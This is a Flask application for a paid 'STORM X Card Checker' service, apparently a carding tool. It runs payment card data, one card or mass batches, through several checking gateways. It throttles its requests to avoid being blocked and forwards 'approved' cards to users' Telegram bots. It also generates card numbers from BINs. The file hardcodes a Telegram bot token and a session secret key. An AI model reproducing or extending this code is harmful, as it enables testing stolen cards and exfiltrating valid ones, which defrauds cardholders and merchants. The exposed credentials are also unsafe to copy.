from flask import Flask, Response, render_template, request, jsonify, session, send_file, stream_with_context, redirect, url_for
from au import process_card_au
from chk import check_card
from vbv import check_vbv_card
from b3 import process_card_b3
from svb import process_card_svb
from pp import process_card_pp
import json
import threading
import time
import sys
import uuid
from datetime import datetime
import requests
import io
import sqlite3
import telebot
from telebot import types
import os

app = Flask(__name__)
app.secret_key = 'storm_x_secret_key_2025'

def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    # Enable WAL mode for better concurrency
    c.execute("PRAGMA journal_mode=WAL;")
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        telegram_id INTEGER UNIQUE,
        username TEXT,
        first_name TEXT,
        last_name TEXT,
        access_key TEXT UNIQUE,
        credits INTEGER DEFAULT 100,
        bot_token TEXT,
        chat_id TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS access_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        access_key TEXT,
        ip_address TEXT,
        accessed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    conn.commit()
    conn.close()

init_db()

# Telegram Bot Setup
TELEGRAM_BOT_TOKEN = "8320534432:AAFPzKpzxWMAPS7aBBYmW-MuOPnOYvxPDOc"
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Store results temporarily
results = {}
result_lock = threading.Lock()

# -----------------------
# Telegram Bot Handlers
# -----------------------
@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Generate access key
    access_key = str(uuid.uuid4())[:8].upper()
    
    # Save user to database
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    try:
        c.execute('''INSERT INTO users (telegram_id, username, first_name, last_name, access_key, credits)
                     VALUES (?, ?, ?, ?, ?, 100)''',
                 (message.from_user.id, message.from_user.username, 
                  message.from_user.first_name, message.from_user.last_name, access_key))
        conn.commit()
    except sqlite3.IntegrityError:
        # User already exists, get their access key
        c.execute('SELECT access_key FROM users WHERE telegram_id = ?', (message.from_user.id,))
        result = c.fetchone()
        access_key = result[0] if result else "ERROR"
    finally:
        conn.close()
    
    # Send welcome message with access key
    bot.reply_to(message, f"🚀 Welcome to STORM X Card Checker!\n\n"
                 f"Your Access Key: `{access_key}`\n\n"
                 f"Use this key to access the web panel. You have 100 free credits to start with!\n\n"
                 f"Web Panel: https://stormx-dark.onrender.com", parse_mode='Markdown')

@bot.message_handler(commands=['credits'])
def check_credits(message):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('SELECT credits FROM users WHERE telegram_id = ?', (message.from_user.id,))
    result = c.fetchone()
    credits = result[0] if result else 0
    conn.close()
    
    bot.reply_to(message, f"Your current credits: {credits}")

# Start bot in a separate thread
def run_bot():
    try:
        bot.polling(none_stop=True, timeout=60)
    except Exception as e:
        print(f"Bot error: {e}")
        # Restart after a delay if there's an error
        time.sleep(10)
        run_bot()

bot_thread = threading.Thread(target=run_bot)
bot_thread.daemon = True
bot_thread.start()

# -----------------------
# Utility Functions
# -----------------------
def get_session_id():
    if 'session_id' not in session:
        session['session_id'] = str(uuid.uuid4())
    return session['session_id']

def get_user_by_access_key(access_key):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE access_key = ?', (access_key,))
    user = c.fetchone()
    conn.close()
    return user

def update_user_credits(user_id, credit_change):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('UPDATE users SET credits = credits + ? WHERE id = ?', (credit_change, user_id))
    conn.commit()
    conn.close()

def log_access(user_id, access_key, ip_address):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('INSERT INTO access_logs (user_id, access_key, ip_address) VALUES (?, ?, ?)',
              (user_id, access_key, ip_address))
    conn.commit()
    conn.close()

def send_card_to_user_bot(user_id, result_entry):
    conn = sqlite3.connect('users.db')
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute('SELECT bot_token, chat_id FROM users WHERE id = ?', (user_id,))
    row = c.fetchone()
    conn.close()

    if not row or not row["bot_token"] or not row["chat_id"]:
        return  # user hasn’t set bot yet

    bot_token = row["bot_token"]
    chat_id = row["chat_id"]

    msg = (
        f"✅ *Approved Card Found!*\n\n"
        f"💳 Card: `{result_entry['card']}`\n"
        f"📡 Gateway: {result_entry['gateway']}\n"
        f"📝 Response: {result_entry['response']}\n"
        f"🏦 Bank: {result_entry['bin'].get('bank', '-')}\n"
        f"🌍 Country: {result_entry['bin'].get('country', '-')}\n"
        f"⏰ Time: {result_entry['timestamp']}"
    )

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        requests.post(
            url,
            json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"},
            timeout=10
        )
    except Exception as e:
        print(f"Failed to send message to user {user_id}: {e}")


# -----------------------
# Middleware to Check Access
# -----------------------
@app.before_request
def check_access():
    # Allow access to static files and login page
    if request.endpoint in ['static', 'login', 'verify_access']:
        return
    
    # Check if user has valid access key in session
    if 'access_key' not in session or 'user_id' not in session:
        return redirect(url_for('login'))
    
    # Verify the access key is still valid
    user = get_user_by_access_key(session['access_key'])
    if not user:
        session.clear()
        return redirect(url_for('login'))
    
    # Check if user has credits
    if user[6] <= 0 and request.endpoint not in ['profile', 'logout']:
        return redirect(url_for('profile'))

@app.route('/login')
def login():
    # If user is already logged in, redirect to home
    if 'user_id' in session and 'access_key' in session:
        # Verify the access key is still valid
        user = get_user_by_access_key(session['access_key'])
        if user:
            return redirect(url_for('index'))
    
    return render_template('login.html')

@app.route('/verify_access', methods=['POST'])
def verify_access():
    access_key = request.form.get('access_key', '').strip().upper()
    user = get_user_by_access_key(access_key)
    
    if user:
        session['access_key'] = access_key
        session['user_id'] = user[0]
        session['username'] = user[2] or user[3] or f"User_{user[0]}"
        session['credits'] = user[6]
        
        # Log the access
        log_access(user[0], access_key, request.remote_addr)
        
        return jsonify({'success': True, 'message': 'Access granted!', 'redirect': url_for('index')})
    else:
        return jsonify({'success': False, 'message': 'Invalid access key!'})

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# -----------------------
# Protected Pages
# -----------------------
@app.route('/')
def index():
    return render_template('index.html', username=session.get('username'), credits=session.get('credits', 0))

@app.route('/single')
def single_check():
    return render_template('single.html', username=session.get('username'), credits=session.get('credits', 0))

@app.route('/mass')
def mass_check_page():
    return render_template('mass.html', username=session.get('username'), credits=session.get('credits', 0))

@app.route('/results')
def results_page():
    return render_template('results.html', username=session.get('username'), credits=session.get('credits', 0))

@app.route('/bin_info', methods=['GET'])
def bin_info_page():
    # This handles GET requests and renders the BIN info page
    return render_template('bin_info.html', username=session.get('username'), credits=session.get('credits', 0))

@app.route('/bin_lookup', methods=['POST'])
def bin_lookup():
    # This handles the actual BIN lookup via POST
    bin_number = request.form.get('bin', '').strip()
    if not bin_number:
        return jsonify({'success': False, 'error': 'BIN is required'})

    try:
        api_url = f"https://bins.antipublic.cc/bins/{bin_number}"
        res = requests.get(api_url, timeout=10)
        if res.status_code != 200:
            return jsonify({'success': False, 'error': 'BIN not found'})
        return jsonify({'success': True, 'data': res.json()})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/profile')
def profile():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    conn = sqlite3.connect('users.db')
    conn.row_factory = sqlite3.Row  # lets us access columns by name
    c = conn.cursor()

    c.execute('SELECT * FROM users WHERE id = ?', (session['user_id'],))
    user = c.fetchone()

    # Get access logs
    c.execute('SELECT * FROM access_logs WHERE user_id = ? ORDER BY accessed_at DESC LIMIT 5', (session['user_id'],))
    access_logs = c.fetchall()
    conn.close()
    
    return render_template(
        'profile.html',
        username=session.get('username'),
        credits=session.get('credits', 0),
        user=user,
        access_logs=access_logs
    )


@app.route('/check_card', methods=['POST'])
def check_card_route():
    # --- Authentication check ---
    if 'user_id' not in session or 'access_key' not in session:
        return jsonify({'error': 'Authentication required'}), 401

    # Verify user exists and has credits
    user = get_user_by_access_key(session['access_key'])
    if not user:
        session.clear()
        return jsonify({'error': 'Invalid session'}), 401
    if user[6] <= 0:
        return jsonify({'error': 'Insufficient credits!'}), 403

    session_id = get_session_id()
    card_data = request.form.get('card_data', '').strip()
    gateway = request.form.get('gateway', 'au')

    if not card_data:
        return jsonify({'error': 'No card data provided'}), 400

    # --- Process the card ---
    if gateway == 'au':
        result = process_card_au(card_data)
    elif gateway == 'chk':
        result = check_card(card_data)
    elif gateway == 'vbv':
        result = check_vbv_card(card_data)
    elif gateway == 'b3':
        result = process_card_b3(card_data)
    elif gateway == "svb" :
        result = process_card_svb(card_data)
    elif gateway == "pp":
        result = process_card_pp(card_data)
    else:
        return jsonify({'error': 'Invalid gateway selected'}), 400

    # --- Deduct credits ---
    update_user_credits(session['user_id'], -1)
    session['credits'] = max(0, session.get('credits', 0) - 1)

    # --- BIN info lookup ---
    bin_number = card_data[:6]
    bin_info = {}
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
        if r.status_code == 200:
            bin_info = r.json()
    except Exception as e:
        bin_info = {"error": str(e)}

    # --- Store result ---
    result_id = str(uuid.uuid4())
    timestamp = datetime.now().strftime("%H:%M:%S")

    result_entry = {
        'id': result_id,
        'card': card_data,
        'status': result.get('status', 'Error'),
        'response': result.get('response', 'Unknown error'),
        'gateway': result.get('gateway', gateway.upper()),
        'timestamp': timestamp,
        'bin': bin_info
    }

    with result_lock:
        if session_id not in results:
            results[session_id] = []
        results[session_id].insert(0, result_entry)
        if len(results[session_id]) > 50:
            results[session_id] = results[session_id][:50]

    # --- Bot notification ---
    if result_entry['status'].lower() == 'approved':
        send_card_to_user_bot(session['user_id'], result_entry)

    return jsonify({
        'success': True,
        **result_entry
    })

import concurrent.futures
import random

def safe_process_card(gateway_func, card_data, timeout=12):
    """Run one card check safely in a thread with timeout and better error handling."""
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
            future = executor.submit(gateway_func, card_data)
            result = future.result(timeout=timeout)
            
            # Ensure the result has the expected structure
            if not isinstance(result, dict):
                return {
                    "status": "Error",
                    "response": "Invalid response format from gateway",
                    "gateway": gateway_func.__name__,
                }
            
            # Check if the response indicates a blocking or timeout
            response_text = str(result.get("response", "")).lower()
            if any(blocked_indicator in response_text for blocked_indicator in 
                  ["timeout", "block", "fail", "error", "invalid", "refused", "denied"]):
                return {
                    "status": "Error",
                    "response": f"Gateway issue: {result.get('response', 'Unknown error')}",
                    "gateway": gateway_func.__name__,
                }
            
            return result
            
    except concurrent.futures.TimeoutError:
        return {
            "status": "Error",
            "response": f"Gateway timeout after {timeout}s",
            "gateway": gateway_func.__name__,
        }
    except Exception as e:
        return {
            "status": "Error",
            "response": f"Gateway error: {str(e)}",
            "gateway": gateway_func.__name__,
        }


@app.route("/mass_check", methods=["GET"])
def mass_check():
    if "user_id" not in session or "access_key" not in session:
        def error_generate():
            yield f"data: {json.dumps({'error': 'Authentication required'})}\n\n"
        return Response(stream_with_context(error_generate()), mimetype="text/event-stream")

    user = get_user_by_access_key(session["access_key"])
    if not user:
        session.clear()
        def error_generate():
            yield f"data: {json.dumps({'error': 'Invalid session'})}\n\n"
        return Response(stream_with_context(error_generate()), mimetype="text/event-stream")

    # --- Prepare cards ---
    raw_card_list = request.args.get("card_list", "")
    card_list = [c.strip() for c in raw_card_list.split("\n") if c.strip()]
    card_count = len(card_list)
    gateway = request.args.get("gateway", "au")

    # --- Check credits upfront ---
    if user[6] < card_count:
        def error_generate():
            yield f"data: {json.dumps({'error': f'Insufficient credits. You have {user[6]} but need {card_count}'})}\n\n"
        return Response(stream_with_context(error_generate()), mimetype="text/event-stream")

    # Deduct credits for all cards upfront
    update_user_credits(session["user_id"], -card_count)
    session["credits"] = max(0, user[6] - card_count)

    def generate():
        processed_count = 0
        successful_checks = 0
        
        for i, card_data in enumerate(card_list):
            try:
                result = None
                
                # Try the selected gateway first
                if gateway == "au":
                    result = safe_process_card(process_card_au, card_data, timeout=10)
                elif gateway == "chk":
                    result = safe_process_card(check_card, card_data, timeout=10)
                elif gateway == "vbv":
                    result = safe_process_card(check_vbv_card, card_data, timeout=15)
                elif gateway == "b3":
                    result = safe_process_card(process_card_b3, card_data, timeout=10)
                elif gateway == "svb":
                    result = safe_process_card(process_card_svb, card_data, timeout=10)
                elif gateway == "pp":
                    result = safe_process_card(process_card_pp, card_data, timeout=10)
                else:
                    result = {"status": "Error", "response": "Invalid gateway", "gateway": "N/A"}

                # If the selected gateway failed, try fallback to VBV
                if result.get("status") == "Error" and gateway != "vbv":
                    result = safe_process_card(check_vbv_card, card_data, timeout=15)
                    result["gateway"] = f"{gateway.upper()}→VBV(Fallback)"

                res_data = {
                    "card": card_data,
                    "status": result.get("status", "Error"),
                    "response": result.get("response", "Unknown error"),
                    "gateway": result.get("gateway", gateway.upper()),
                }

                # Count successful checks (non-error responses)
                if result.get("status") != "Error":
                    successful_checks += 1

                # --- Send approved to user bot ---
                if res_data["status"].lower() == "approved":
                    try:
                        send_card_to_user_bot(
                            session["user_id"],
                            {
                                "card": card_data,
                                "status": res_data["status"],
                                "response": res_data["response"],
                                "gateway": res_data["gateway"],
                                "bin": {},
                                "timestamp": datetime.now().strftime("%H:%M:%S"),
                            },
                        )
                    except Exception as bot_error:
                        print(f"Bot notification failed: {bot_error}")

                processed_count += 1
                yield f"data: {json.dumps(res_data)}\n\n"

                # Dynamic delay based on success rate
                if successful_checks / max(1, processed_count) > 0.7:
                    # If success rate is high, use shorter delay
                    time.sleep(0.3)
                else:
                    # If many failures, use longer delay to avoid blocking
                    time.sleep(1.0)

            except Exception as e:
                # Log the error but continue with next card
                error_data = {
                    "card": card_data,
                    "status": "Error",
                    "response": f"Processing failed: {str(e)}",
                    "gateway": gateway.upper(),
                }
                yield f"data: {json.dumps(error_data)}\n\n"
                time.sleep(1.0)  # Longer delay after error
                continue

        # Send completion message
        yield f"data: {json.dumps({'complete': True, 'processed': processed_count, 'total': card_count, 'successful': successful_checks})}\n\n"

    return Response(stream_with_context(generate()), mimetype="text/event-stream")
    
@app.route('/save_bot', methods=['POST'])
def save_bot():
    if 'user_id' not in session:
        return redirect(url_for('login'))

    bot_token = request.form.get('bot_token', '').strip()
    chat_id = request.form.get('chat_id', '').strip()

    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute(
        "UPDATE users SET bot_token = ?, chat_id = ? WHERE id = ?",
        (bot_token, chat_id, session['user_id'])
    )
    conn.commit()
    conn.close()

    # flash message optional
    return redirect(url_for('profile'))


@app.route('/get_results')
def get_results():
    session_id = get_session_id()
    with result_lock:
        session_results = results.get(session_id, [])
    return jsonify({'results': session_results})


@app.route('/clear_results')
def clear_results():
    session_id = get_session_id()
    with result_lock:
        if session_id in results:
            results[session_id] = []
    return jsonify({'success': True})


@app.route('/gen', methods=['GET', 'POST'])
def gen_card():
    if request.method == 'GET':
        # Render the form page
        return render_template('gen.html', username=session.get('username'), credits=session.get('credits', 0))
    
    # Handle POST request (form submission)
    bin_number = request.form.get('bin', '').strip()
    count = request.form.get('quantity', '10').strip()

    if not bin_number:
        return jsonify({'success': False, 'error': 'BIN is required'})

    try:
        api_url = f"https://drlabapis.onrender.com/api/ccgenerator?bin={bin_number}&count={count}"
        res = requests.get(api_url)
        
        # Check if response is HTML (error page)
        if 'text/html' in res.headers.get('Content-Type', ''):
            return jsonify({'success': False, 'error': 'Card generation service is temporarily unavailable'})
        
        try:
            data = res.json()
            cards = data.get("cards", [])
        except json.JSONDecodeError:
            # If it's not JSON, try to extract cards from text response
            content = res.text
            # Try to find card patterns in the response
            import re
            card_pattern = r'\b\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}\b'
            cards = re.findall(card_pattern, content)
            
            if not cards:
                return jsonify({'success': False, 'error': 'Failed to generate cards. Invalid response from service.'})

        if int(count) > 10:
            content = "\n".join(cards)
            return send_file(
                io.BytesIO(content.encode("utf-8")),
                as_attachment=True,
                download_name=f"generated_cards_{bin_number}.txt",
                mimetype="text/plain"
            )

        return render_template('gen.html', 
                              username=session.get('username'), 
                              credits=session.get('credits', 0),
                              cards=cards,
                              bin=bin_number)

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
# -----------------------
# BIN INFO
# -----------------------
@app.route('/bin_info', methods=['POST'])
def bin_info():
    bin_number = request.form.get('bin', '').strip()
    if not bin_number:
        return jsonify({'success': False, 'error': 'BIN is required'})

    try:
        api_url = f"https://bins.antipublic.cc/bins/{bin_number}"
        res = requests.get(api_url)
        if res.status_code != 200:
            return jsonify({'success': False, 'error': 'BIN not found'})
        return jsonify({'success': True, 'data': res.json()})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# -----------------------
# MAIN
# -----------------------
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
